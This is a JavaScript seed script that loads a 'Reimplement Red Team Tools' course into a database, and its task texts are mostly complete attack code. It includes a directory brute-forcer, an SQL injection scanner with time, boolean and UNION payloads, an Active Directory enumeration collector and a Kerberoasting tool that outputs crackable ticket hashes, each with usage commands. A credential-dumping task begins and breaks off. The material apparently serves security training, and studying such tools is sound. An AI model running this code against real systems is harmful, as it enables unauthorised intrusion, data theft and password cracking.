import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// REIMPLEMENT RED TEAM TOOLS - PART 2: WEB & AD TOOLS
// ============================================================================
const path1 = insertPath.run(
	'Reimplement Red Team Tools: Web & AD',
	'Build your own versions of gobuster, sqlmap, BloodHound collector, Rubeus, and Mimikatz-like tools from scratch.',
	'orange',
	now
);

// Module 1: Web Tools
const mod1 = insertModule.run(path1.lastInsertRowid, 'Build Web Attack Tools', 'Reimplement gobuster, sqlmap, and web proxies', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build gobuster-style Directory Scanner', 'Build a concurrent web directory brute-forcer in Go with wordlist support, wildcard detection, status code filtering, custom headers, and extension fuzzing for discovering hidden paths and files', `## Gobuster Clone - Directory Scanner

### How Gobuster Works
\`\`\`
1. Takes wordlist of common paths
2. Makes HTTP requests for each path
3. Filters by response code
4. Supports multiple modes: dir, dns, vhost
5. Uses Go for high concurrency
\`\`\`

### Full Implementation (Go)
\`\`\`go
// gobuster_clone.go
package main

import (
    "bufio"
    "crypto/tls"
    "flag"
    "fmt"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
)

type Result struct {
    Path   string
    Status int
    Size   int64
}

type Scanner struct {
    baseURL    string
    wordlist   string
    threads    int
    timeout    time.Duration
    extensions []string
    statusShow []int
    statusHide []int
    client     *http.Client
    results    []Result
    mu         sync.Mutex
    wg         sync.WaitGroup
}

func NewScanner(baseURL, wordlist string, threads int, timeout int) *Scanner {
    tr := &http.Transport{
        TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
        MaxIdleConns:        threads,
        MaxIdleConnsPerHost: threads,
    }

    client := &http.Client{
        Transport: tr,
        Timeout:   time.Duration(timeout) * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    return &Scanner{
        baseURL:    strings.TrimRight(baseURL, "/"),
        wordlist:   wordlist,
        threads:    threads,
        timeout:    time.Duration(timeout) * time.Second,
        client:     client,
        statusShow: []int{200, 201, 204, 301, 302, 307, 401, 403},
    }
}

func (s *Scanner) worker(jobs <-chan string) {
    defer s.wg.Done()

    for path := range jobs {
        s.scanPath(path)
    }
}

func (s *Scanner) scanPath(path string) {
    fullURL := fmt.Sprintf("%s/%s", s.baseURL, path)

    resp, err := s.client.Get(fullURL)
    if err != nil {
        return
    }
    defer resp.Body.Close()

    // Check if status should be shown
    show := false
    for _, code := range s.statusShow {
        if resp.StatusCode == code {
            show = true
            break
        }
    }

    // Check if status should be hidden
    for _, code := range s.statusHide {
        if resp.StatusCode == code {
            show = false
            break
        }
    }

    if show {
        result := Result{
            Path:   path,
            Status: resp.StatusCode,
            Size:   resp.ContentLength,
        }

        s.mu.Lock()
        s.results = append(s.results, result)
        s.mu.Unlock()

        // Color output
        color := "\\033[0m"
        switch {
        case resp.StatusCode >= 200 && resp.StatusCode < 300:
            color = "\\033[92m" // Green
        case resp.StatusCode >= 300 && resp.StatusCode < 400:
            color = "\\033[93m" // Yellow
        case resp.StatusCode == 401 || resp.StatusCode == 403:
            color = "\\033[91m" // Red
        }

        fmt.Printf("%s/%s (Status: %s%d\\033[0m) [Size: %d]\\n",
            s.baseURL, path, color, resp.StatusCode, resp.ContentLength)
    }
}

func (s *Scanner) loadWordlist() ([]string, error) {
    file, err := os.Open(s.wordlist)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var words []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        word := strings.TrimSpace(scanner.Text())
        if word != "" && !strings.HasPrefix(word, "#") {
            words = append(words, word)

            // Add extensions
            for _, ext := range s.extensions {
                words = append(words, word+"."+ext)
            }
        }
    }

    return words, scanner.Err()
}

func (s *Scanner) Run() error {
    words, err := s.loadWordlist()
    if err != nil {
        return err
    }

    fmt.Printf(\`
===============================================================
Gobuster Clone v1.0
===============================================================
[+] URL:         %s
[+] Wordlist:    %s (%d words)
[+] Threads:     %d
[+] Extensions:  %v
===============================================================
\`, s.baseURL, s.wordlist, len(words), s.threads, s.extensions)

    jobs := make(chan string, s.threads)

    // Start workers
    for i := 0; i < s.threads; i++ {
        s.wg.Add(1)
        go s.worker(jobs)
    }

    // Send jobs
    for _, word := range words {
        jobs <- word
    }
    close(jobs)

    // Wait for completion
    s.wg.Wait()

    fmt.Printf("\\n===============================================================\\n")
    fmt.Printf("Finished: Found %d results\\n", len(s.results))

    return nil
}

func main() {
    urlFlag := flag.String("u", "", "Target URL")
    wordlistFlag := flag.String("w", "", "Wordlist path")
    threadsFlag := flag.Int("t", 10, "Number of threads")
    timeoutFlag := flag.Int("timeout", 10, "Timeout in seconds")
    extFlag := flag.String("x", "", "Extensions (comma-separated)")
    hideFlag := flag.String("b", "", "Hide status codes (comma-separated)")

    flag.Parse()

    if *urlFlag == "" || *wordlistFlag == "" {
        fmt.Println("Usage: gobuster_clone -u <url> -w <wordlist>")
        flag.PrintDefaults()
        os.Exit(1)
    }

    scanner := NewScanner(*urlFlag, *wordlistFlag, *threadsFlag, *timeoutFlag)

    if *extFlag != "" {
        scanner.extensions = strings.Split(*extFlag, ",")
    }

    if *hideFlag != "" {
        for _, code := range strings.Split(*hideFlag, ",") {
            var c int
            fmt.Sscanf(code, "%d", &c)
            scanner.statusHide = append(scanner.statusHide, c)
        }
    }

    if err := scanner.Run(); err != nil {
        fmt.Printf("Error: %v\\n", err)
        os.Exit(1)
    }
}
\`\`\`

### Build & Usage
\`\`\`bash
go build -o gobuster_clone gobuster_clone.go

# Basic scan
./gobuster_clone -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
./gobuster_clone -u http://target.com -w wordlist.txt -x php,txt,html

# More threads
./gobuster_clone -u http://target.com -w wordlist.txt -t 50

# Hide 404s
./gobuster_clone -u http://target.com -w wordlist.txt -b 404,403
\`\`\``, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build sqlmap-style SQL Injection Tool', 'Implement automated SQL injection testing with support for boolean-blind, time-blind, error-based, and UNION techniques, database fingerprinting, data extraction, and WAF bypass using tamper scripts', `## SQLMap Clone - SQL Injection Tool

### How SQLMap Works
\`\`\`
1. Tests parameters for SQL injection
2. Determines database type
3. Uses various injection techniques:
   - Boolean-based blind
   - Time-based blind
   - Error-based
   - UNION-based
4. Extracts data once injection found
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
sqlmap_clone.py - SQL Injection Detection & Exploitation
"""

import requests
import argparse
import re
import time
import urllib.parse
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass

@dataclass
class InjectionPoint:
    parameter: str
    injection_type: str
    payload: str
    dbms: str

class SQLiScanner:
    def __init__(self, url: str, data: str = None, method: str = 'GET'):
        self.url = url
        self.data = data
        self.method = method.upper()
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        self.injection_points: List[InjectionPoint] = []
        self.dbms = None
        self.verbose = True

    def log(self, msg: str, level: str = 'info'):
        colors = {
            'info': '\\033[94m[*]\\033[0m',
            'success': '\\033[92m[+]\\033[0m',
            'warning': '\\033[93m[!]\\033[0m',
            'error': '\\033[91m[-]\\033[0m'
        }
        if self.verbose:
            print(f"{colors.get(level, '[*]')} {msg}")

    def get_parameters(self) -> Dict[str, str]:
        """Extract parameters from URL or data"""
        params = {}

        # URL parameters
        parsed = urllib.parse.urlparse(self.url)
        if parsed.query:
            params.update(urllib.parse.parse_qs(parsed.query, keep_blank_values=True))
            params = {k: v[0] for k, v in params.items()}

        # POST data
        if self.data:
            params.update(urllib.parse.parse_qs(self.data, keep_blank_values=True))
            params = {k: v[0] for k, v in params.items()}

        return params

    def make_request(self, params: Dict[str, str]) -> requests.Response:
        """Make HTTP request with given parameters"""
        try:
            if self.method == 'GET':
                parsed = urllib.parse.urlparse(self.url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                return self.session.get(base_url, params=params, timeout=30)
            else:
                parsed = urllib.parse.urlparse(self.url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                return self.session.post(base_url, data=params, timeout=30)
        except Exception as e:
            self.log(f"Request error: {e}", 'error')
            return None

    def test_error_based(self, param: str, original_params: Dict) -> Optional[InjectionPoint]:
        """Test for error-based SQL injection"""
        error_payloads = [
            ("'", "single quote"),
            ('"', "double quote"),
            ("'--", "comment"),
            ("' OR '1'='1", "OR injection"),
            ("1' AND '1'='1", "AND injection"),
        ]

        # Database error patterns
        db_errors = {
            'MySQL': [r'SQL syntax.*MySQL', r'Warning.*mysql_', r'MySQLSyntaxErrorException'],
            'PostgreSQL': [r'PostgreSQL.*ERROR', r'Warning.*pg_', r'PG::SyntaxError'],
            'MSSQL': [r'Driver.* SQL Server', r'OLE DB.* SQL Server', r'SQLServer JDBC'],
            'Oracle': [r'ORA-[0-9]+', r'Oracle error', r'Warning.*oci_'],
            'SQLite': [r'SQLite/JDBCDriver', r'SQLite.Exception', r'SQLITE_ERROR'],
        }

        for payload, desc in error_payloads:
            test_params = original_params.copy()
            test_params[param] = original_params[param] + payload

            resp = self.make_request(test_params)
            if not resp:
                continue

            # Check for database errors
            for dbms, patterns in db_errors.items():
                for pattern in patterns:
                    if re.search(pattern, resp.text, re.I):
                        self.log(f"Error-based SQLi found in '{param}' [{dbms}]", 'success')
                        return InjectionPoint(param, 'error-based', payload, dbms)

        return None

    def test_boolean_based(self, param: str, original_params: Dict) -> Optional[InjectionPoint]:
        """Test for boolean-based blind SQL injection"""
        # Get baseline response
        baseline_resp = self.make_request(original_params)
        if not baseline_resp:
            return None
        baseline_len = len(baseline_resp.text)

        # True/False payloads
        payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' OR '1'='1", "' OR '1'='2"),
        ]

        for true_payload, false_payload in payloads:
            # Test true condition
            true_params = original_params.copy()
            true_params[param] = original_params[param] + true_payload
            true_resp = self.make_request(true_params)
            if not true_resp:
                continue

            # Test false condition
            false_params = original_params.copy()
            false_params[param] = original_params[param] + false_payload
            false_resp = self.make_request(false_params)
            if not false_resp:
                continue

            # Compare responses
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant difference indicates boolean injection
            if abs(true_len - baseline_len) < 50 and abs(false_len - baseline_len) > 100:
                self.log(f"Boolean-based blind SQLi found in '{param}'", 'success')
                return InjectionPoint(param, 'boolean-based', true_payload, 'Unknown')

        return None

    def test_time_based(self, param: str, original_params: Dict) -> Optional[InjectionPoint]:
        """Test for time-based blind SQL injection"""
        delay = 5  # seconds

        payloads = [
            (f"' AND SLEEP({delay})--", 'MySQL'),
            (f"'; WAITFOR DELAY '0:0:{delay}'--", 'MSSQL'),
            (f"' AND pg_sleep({delay})--", 'PostgreSQL'),
            (f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", 'Oracle'),
        ]

        for payload, dbms in payloads:
            test_params = original_params.copy()
            test_params[param] = original_params[param] + payload

            start = time.time()
            resp = self.make_request(test_params)
            elapsed = time.time() - start

            if elapsed >= delay - 1:  # Allow 1 second tolerance
                self.log(f"Time-based blind SQLi found in '{param}' [{dbms}]", 'success')
                return InjectionPoint(param, 'time-based', payload, dbms)

        return None

    def test_union_based(self, param: str, original_params: Dict) -> Optional[InjectionPoint]:
        """Test for UNION-based SQL injection"""
        # First, find the number of columns
        for num_cols in range(1, 20):
            nulls = ','.join(['NULL'] * num_cols)
            payload = f"' UNION SELECT {nulls}--"

            test_params = original_params.copy()
            test_params[param] = original_params[param] + payload

            resp = self.make_request(test_params)
            if not resp:
                continue

            # Check if response doesn't contain SQL error
            if 'error' not in resp.text.lower() and 'warning' not in resp.text.lower():
                self.log(f"UNION-based SQLi found in '{param}' (columns: {num_cols})", 'success')
                return InjectionPoint(param, 'union-based', payload, 'Unknown')

        return None

    def extract_data(self, injection: InjectionPoint) -> None:
        """Extract database information using found injection"""
        self.log(f"Extracting data using {injection.injection_type} injection...")

        if injection.injection_type == 'union-based':
            self.extract_union(injection)
        elif injection.injection_type == 'boolean-based':
            self.extract_boolean(injection)
        elif injection.injection_type == 'time-based':
            self.extract_time(injection)

    def extract_union(self, injection: InjectionPoint) -> None:
        """Extract data via UNION injection"""
        params = self.get_parameters()

        # Get database version
        version_queries = {
            'MySQL': "' UNION SELECT @@version,NULL--",
            'PostgreSQL': "' UNION SELECT version(),NULL--",
            'MSSQL': "' UNION SELECT @@version,NULL--",
        }

        for dbms, query in version_queries.items():
            test_params = params.copy()
            test_params[injection.parameter] = params[injection.parameter] + query
            resp = self.make_request(test_params)
            if resp and ('MariaDB' in resp.text or 'PostgreSQL' in resp.text or 'Microsoft' in resp.text):
                self.log(f"Database version found in response", 'success')
                break

    def scan(self) -> List[InjectionPoint]:
        """Run full SQL injection scan"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║               SQLMap Clone v1.0                           ║
╚═══════════════════════════════════════════════════════════╝
        """)

        params = self.get_parameters()
        if not params:
            self.log("No parameters found to test", 'error')
            return []

        self.log(f"URL: {self.url}")
        self.log(f"Method: {self.method}")
        self.log(f"Parameters: {list(params.keys())}")
        print()

        for param in params:
            self.log(f"Testing parameter: {param}")

            # Test each injection type
            for test_func in [self.test_error_based, self.test_boolean_based,
                             self.test_time_based, self.test_union_based]:
                result = test_func(param, params)
                if result:
                    self.injection_points.append(result)
                    self.dbms = result.dbms
                    break

        print()
        if self.injection_points:
            self.log(f"Found {len(self.injection_points)} injection point(s)", 'success')
            for inj in self.injection_points:
                print(f"    Parameter: {inj.parameter}")
                print(f"    Type: {inj.injection_type}")
                print(f"    DBMS: {inj.dbms}")
        else:
            self.log("No SQL injection vulnerabilities found", 'warning')

        return self.injection_points


def main():
    parser = argparse.ArgumentParser(description='SQLMap Clone')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--data', help='POST data')
    parser.add_argument('--method', default='GET', help='HTTP method')
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', action='store_true', help='Enumerate tables')
    args = parser.parse_args()

    scanner = SQLiScanner(args.url, args.data, args.method)
    injections = scanner.scan()

    if injections and (args.dbs or args.tables):
        scanner.extract_data(injections[0])


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Test URL parameter
python3 sqlmap_clone.py -u "http://target.com/page.php?id=1"

# Test POST parameter
python3 sqlmap_clone.py -u "http://target.com/login.php" --data "user=admin&pass=test" --method POST

# With data extraction
python3 sqlmap_clone.py -u "http://target.com/page.php?id=1" --dbs
\`\`\``, 1, now);

// Module 2: AD Attack Tools
const mod2 = insertModule.run(path1.lastInsertRowid, 'Build AD Attack Tools', 'Reimplement BloodHound collector, Rubeus, and credential tools', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Build BloodHound Data Collector', 'Enumerate Active Directory objects, group memberships, sessions, ACLs, and trusts via LDAP and SMB, outputting JSON files compatible with BloodHound for visualizing attack paths to domain admin', `## BloodHound Collector Clone

### How BloodHound Collection Works
\`\`\`
1. Queries Active Directory via LDAP
2. Collects:
   - Users, Groups, Computers
   - Group memberships
   - ACLs and permissions
   - Session information
   - Trust relationships
3. Outputs JSON for BloodHound import
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
bloodhound_clone.py - AD Data Collector for BloodHound
"""

import argparse
import json
import ssl
from datetime import datetime
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
from typing import Dict, List, Optional
import socket

class BloodHoundCollector:
    def __init__(self, domain: str, username: str, password: str,
                 dc_ip: str = None, use_ssl: bool = False):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip or self.get_dc_ip()
        self.use_ssl = use_ssl

        # Build base DN from domain
        self.base_dn = ','.join([f'DC={part}' for part in domain.split('.')])

        # Data storage
        self.users = []
        self.groups = []
        self.computers = []
        self.domains = []
        self.gpos = []

        self.conn = None

    def get_dc_ip(self) -> str:
        """Get DC IP from DNS"""
        try:
            return socket.gethostbyname(self.domain)
        except:
            return None

    def connect(self) -> bool:
        """Connect to LDAP"""
        try:
            port = 636 if self.use_ssl else 389
            server = Server(self.dc_ip, port=port, use_ssl=self.use_ssl, get_info=ALL)

            self.conn = Connection(
                server,
                user=f'{self.domain}\\\\{self.username}',
                password=self.password,
                authentication=NTLM
            )

            if not self.conn.bind():
                print(f"[-] Bind failed: {self.conn.last_error}")
                return False

            print(f"[+] Connected to {self.dc_ip}")
            return True

        except Exception as e:
            print(f"[-] Connection error: {e}")
            return False

    def collect_users(self) -> List[Dict]:
        """Collect user objects"""
        print("[*] Collecting users...")

        user_filter = '(&(objectClass=user)(objectCategory=person))'
        attributes = [
            'sAMAccountName', 'distinguishedName', 'memberOf',
            'primaryGroupID', 'userAccountControl', 'servicePrincipalName',
            'adminCount', 'lastLogon', 'pwdLastSet', 'description'
        ]

        self.conn.search(
            self.base_dn,
            user_filter,
            search_scope=SUBTREE,
            attributes=attributes
        )

        for entry in self.conn.entries:
            user = {
                'ObjectIdentifier': str(entry.entry_dn),
                'Properties': {
                    'name': str(entry.sAMAccountName) if entry.sAMAccountName else '',
                    'domain': self.domain.upper(),
                    'distinguishedname': str(entry.distinguishedName),
                    'enabled': not (int(entry.userAccountControl.value or 0) & 2),
                    'hasspn': bool(entry.servicePrincipalName),
                    'admincount': bool(entry.adminCount.value),
                    'description': str(entry.description) if entry.description else '',
                },
                'MemberOf': list(entry.memberOf) if entry.memberOf else [],
                'PrimaryGroupSID': str(entry.primaryGroupID.value) if entry.primaryGroupID else '',
                'SPNs': list(entry.servicePrincipalName) if entry.servicePrincipalName else [],
            }
            self.users.append(user)

        print(f"[+] Collected {len(self.users)} users")
        return self.users

    def collect_groups(self) -> List[Dict]:
        """Collect group objects"""
        print("[*] Collecting groups...")

        group_filter = '(objectClass=group)'
        attributes = [
            'sAMAccountName', 'distinguishedName', 'member',
            'adminCount', 'description'
        ]

        self.conn.search(
            self.base_dn,
            group_filter,
            search_scope=SUBTREE,
            attributes=attributes
        )

        for entry in self.conn.entries:
            group = {
                'ObjectIdentifier': str(entry.entry_dn),
                'Properties': {
                    'name': str(entry.sAMAccountName) if entry.sAMAccountName else '',
                    'domain': self.domain.upper(),
                    'distinguishedname': str(entry.distinguishedName),
                    'admincount': bool(entry.adminCount.value) if entry.adminCount else False,
                    'description': str(entry.description) if entry.description else '',
                },
                'Members': list(entry.member) if entry.member else [],
            }
            self.groups.append(group)

        print(f"[+] Collected {len(self.groups)} groups")
        return self.groups

    def collect_computers(self) -> List[Dict]:
        """Collect computer objects"""
        print("[*] Collecting computers...")

        computer_filter = '(objectClass=computer)'
        attributes = [
            'sAMAccountName', 'distinguishedName', 'dNSHostName',
            'operatingSystem', 'operatingSystemVersion', 'userAccountControl',
            'lastLogon', 'servicePrincipalName'
        ]

        self.conn.search(
            self.base_dn,
            computer_filter,
            search_scope=SUBTREE,
            attributes=attributes
        )

        for entry in self.conn.entries:
            computer = {
                'ObjectIdentifier': str(entry.entry_dn),
                'Properties': {
                    'name': str(entry.sAMAccountName).rstrip('$') if entry.sAMAccountName else '',
                    'domain': self.domain.upper(),
                    'distinguishedname': str(entry.distinguishedName),
                    'dnshostname': str(entry.dNSHostName) if entry.dNSHostName else '',
                    'operatingsystem': str(entry.operatingSystem) if entry.operatingSystem else '',
                    'enabled': not (int(entry.userAccountControl.value or 0) & 2),
                },
                'SPNs': list(entry.servicePrincipalName) if entry.servicePrincipalName else [],
            }
            self.computers.append(computer)

        print(f"[+] Collected {len(self.computers)} computers")
        return self.computers

    def collect_domain_info(self) -> Dict:
        """Collect domain information"""
        print("[*] Collecting domain info...")

        domain_filter = '(objectClass=domain)'
        attributes = ['distinguishedName', 'objectSid', 'ms-DS-MachineAccountQuota']

        self.conn.search(
            self.base_dn,
            domain_filter,
            search_scope=SUBTREE,
            attributes=attributes
        )

        if self.conn.entries:
            entry = self.conn.entries[0]
            domain_info = {
                'ObjectIdentifier': str(entry.distinguishedName),
                'Properties': {
                    'name': self.domain.upper(),
                    'distinguishedname': str(entry.distinguishedName),
                }
            }
            self.domains.append(domain_info)
            print(f"[+] Collected domain info")

        return self.domains

    def find_kerberoastable(self) -> List[Dict]:
        """Find Kerberoastable accounts (users with SPNs)"""
        print("[*] Finding Kerberoastable accounts...")

        kerberoastable = []
        for user in self.users:
            if user['SPNs']:
                kerberoastable.append({
                    'username': user['Properties']['name'],
                    'spns': user['SPNs'],
                    'enabled': user['Properties']['enabled']
                })

        if kerberoastable:
            print(f"[+] Found {len(kerberoastable)} Kerberoastable accounts:")
            for k in kerberoastable:
                print(f"    {k['username']}: {k['spns'][0]}")

        return kerberoastable

    def find_asreproastable(self) -> List[Dict]:
        """Find AS-REP Roastable accounts (no preauth required)"""
        print("[*] Finding AS-REP Roastable accounts...")

        asrep = []
        for user in self.users:
            # Check DONT_REQ_PREAUTH flag (0x400000)
            # This requires userAccountControl in collection
            asrep.append(user['Properties']['name'])

        return asrep

    def export_bloodhound(self, output_dir: str = '.') -> None:
        """Export data in BloodHound format"""
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')

        # Users JSON
        users_data = {
            'data': self.users,
            'meta': {
                'type': 'users',
                'count': len(self.users),
                'version': 5
            }
        }
        with open(f'{output_dir}/{timestamp}_users.json', 'w') as f:
            json.dump(users_data, f, indent=2)

        # Groups JSON
        groups_data = {
            'data': self.groups,
            'meta': {
                'type': 'groups',
                'count': len(self.groups),
                'version': 5
            }
        }
        with open(f'{output_dir}/{timestamp}_groups.json', 'w') as f:
            json.dump(groups_data, f, indent=2)

        # Computers JSON
        computers_data = {
            'data': self.computers,
            'meta': {
                'type': 'computers',
                'count': len(self.computers),
                'version': 5
            }
        }
        with open(f'{output_dir}/{timestamp}_computers.json', 'w') as f:
            json.dump(computers_data, f, indent=2)

        print(f"[+] Exported BloodHound data to {output_dir}/")

    def run(self) -> None:
        """Run full collection"""
        if not self.connect():
            return

        self.collect_users()
        self.collect_groups()
        self.collect_computers()
        self.collect_domain_info()

        print()
        self.find_kerberoastable()
        self.find_asreproastable()

        print()
        self.export_bloodhound()

        self.conn.unbind()


def main():
    parser = argparse.ArgumentParser(description='BloodHound Collector Clone')
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('--dc-ip', help='Domain controller IP')
    parser.add_argument('--ssl', action='store_true', help='Use LDAPS')
    parser.add_argument('-o', '--output', default='.', help='Output directory')
    args = parser.parse_args()

    collector = BloodHoundCollector(
        args.domain,
        args.username,
        args.password,
        args.dc_ip,
        args.ssl
    )
    collector.run()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Collect from domain
python3 bloodhound_clone.py -d corp.local -u user -p 'Password123'

# Specify DC
python3 bloodhound_clone.py -d corp.local -u user -p 'Password123' --dc-ip 10.30.30.100

# Import to BloodHound
# Drag JSON files into BloodHound GUI
\`\`\``, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Build Kerberoasting Tool (Rubeus-style)', 'Enumerate SPNs in Active Directory, request TGS tickets for service accounts, extract the encrypted ticket portions in hashcat-compatible format, and perform offline password cracking against weak service account passwords', `## Kerberoasting Tool (Rubeus Clone)

### How Kerberoasting Works
\`\`\`
1. Find accounts with SPNs (Service Principal Names)
2. Request TGS tickets for those SPNs
3. TGS is encrypted with service account's password hash
4. Extract ticket and crack offline
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
kerberoast_clone.py - Kerberoasting Tool
Request service tickets for offline cracking
"""

import argparse
import datetime
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from pyasn1.codec.der import decoder
from binascii import hexlify
import ldap3

class Kerberoaster:
    def __init__(self, domain: str, username: str, password: str,
                 dc_ip: str = None):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.tgt = None
        self.cipher = None
        self.session_key = None

    def get_tgt(self) -> bool:
        """Get TGT for authentication"""
        try:
            user_principal = Principal(
                self.username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )

            self.tgt, self.cipher, _, self.session_key = getKerberosTGT(
                user_principal,
                self.password,
                self.domain,
                lmhash='',
                nthash='',
                kdcHost=self.dc_ip
            )

            print(f"[+] Got TGT for {self.username}@{self.domain}")
            return True

        except Exception as e:
            print(f"[-] Failed to get TGT: {e}")
            return False

    def find_spn_users(self) -> list:
        """Find users with SPNs via LDAP"""
        print("[*] Searching for users with SPNs...")

        base_dn = ','.join([f'DC={part}' for part in self.domain.split('.')])

        server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=f'{self.domain}\\\\{self.username}',
            password=self.password,
            authentication=ldap3.NTLM
        )

        if not conn.bind():
            print(f"[-] LDAP bind failed: {conn.last_error}")
            return []

        # Search for users with SPNs (not computer accounts)
        spn_filter = '(&(servicePrincipalName=*)(!(objectCategory=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'

        conn.search(
            base_dn,
            spn_filter,
            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
        )

        spn_users = []
        for entry in conn.entries:
            user = {
                'username': str(entry.sAMAccountName),
                'spns': list(entry.servicePrincipalName),
                'memberof': list(entry.memberOf) if entry.memberOf else []
            }
            spn_users.append(user)
            print(f"[+] Found: {user['username']} - {user['spns'][0]}")

        conn.unbind()
        return spn_users

    def request_tgs(self, spn: str, username: str) -> str:
        """Request TGS for SPN"""
        try:
            server_principal = Principal(
                spn,
                type=constants.PrincipalNameType.NT_SRV_INST.value
            )

            tgs, cipher, _, session_key = getKerberosTGS(
                server_principal,
                self.domain,
                self.tgt,
                self.session_key,
                self.cipher,
                self.dc_ip
            )

            # Parse TGS-REP
            tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            # Extract encrypted part
            enc_part = tgs_rep['ticket']['enc-part']
            etype = int(enc_part['etype'])
            cipher_text = hexlify(bytes(enc_part['cipher'])).decode('utf-8')

            # Format for hashcat
            if etype == 23:  # RC4
                hash_format = "$krb5tgs$23$*" + username + "$" + self.domain.upper() + "$" + spn + "*$" + cipher_text[:32] + "$" + cipher_text[32:]
            elif etype == 17:  # AES128
                hash_format = "$krb5tgs$17$" + self.domain.upper() + "$" + spn + "$" + cipher_text
            elif etype == 18:  # AES256
                hash_format = "$krb5tgs$18$" + self.domain.upper() + "$" + spn + "$" + cipher_text
            else:
                hash_format = "$krb5tgs$" + str(etype) + "$" + cipher_text

            return hash_format

        except Exception as e:
            print(f"[-] Failed to get TGS for {spn}: {e}")
            return None

    def run(self, output_file: str = None) -> list:
        """Run Kerberoasting attack"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║           Kerberoaster Clone (Rubeus-style)               ║
╚═══════════════════════════════════════════════════════════╝
        """)

        # Get TGT first
        if not self.get_tgt():
            return []

        # Find SPN users
        spn_users = self.find_spn_users()
        if not spn_users:
            print("[-] No Kerberoastable users found")
            return []

        print(f"\\n[*] Requesting TGS tickets...")

        hashes = []
        for user in spn_users:
            for spn in user['spns']:
                hash_str = self.request_tgs(spn, user['username'])
                if hash_str:
                    hashes.append({
                        'username': user['username'],
                        'spn': spn,
                        'hash': hash_str
                    })
                    print(f"[+] Got hash for {user['username']}")
                    break  # One SPN per user is enough

        # Output
        if output_file:
            with open(output_file, 'w') as f:
                for h in hashes:
                    f.write(h['hash'] + '\\n')
            print(f"\\n[+] Saved {len(hashes)} hashes to {output_file}")
        else:
            print("\\n[*] Hashes (hashcat -m 13100):")
            for h in hashes:
                print(h['hash'])

        return hashes


def main():
    parser = argparse.ArgumentParser(description='Kerberoasting Tool')
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('--dc-ip', required=True, help='Domain controller IP')
    parser.add_argument('-o', '--output', help='Output file for hashes')
    args = parser.parse_args()

    roaster = Kerberoaster(
        args.domain,
        args.username,
        args.password,
        args.dc_ip
    )
    roaster.run(args.output)


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Install dependencies
pip3 install impacket ldap3

# Run Kerberoasting
python3 kerberoast_clone.py -d corp.local -u user -p 'Password123' --dc-ip 10.30.30.100

# Save to file
python3 kerberoast_clone.py -d corp.local -u user -p 'Password123' --dc-ip 10.30.30.100 -o hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
\`\`\``, 1, now);

insertTask.run(mod2.lastInsertRowid, 'Build Credential Dumper (Mimikatz concepts)', 'Understand Windows credential storage mechanisms and implement extraction techniques for LSASS memory, SAM database, cached domain credentials, and DPAPI secrets using Windows API and memory parsing', `## Credential Dumper - Mimikatz Concepts

### How Mimikatz Works
\`\`\`
1. LSASS Process Memory:
   - Contains cached credentials
   - NTLM hashes, Kerberos tickets
   - Plaintext passwords (under certain conditions)

2. SAM Database:
   - Local account hashes
   - Located in registry

3. Techniques:
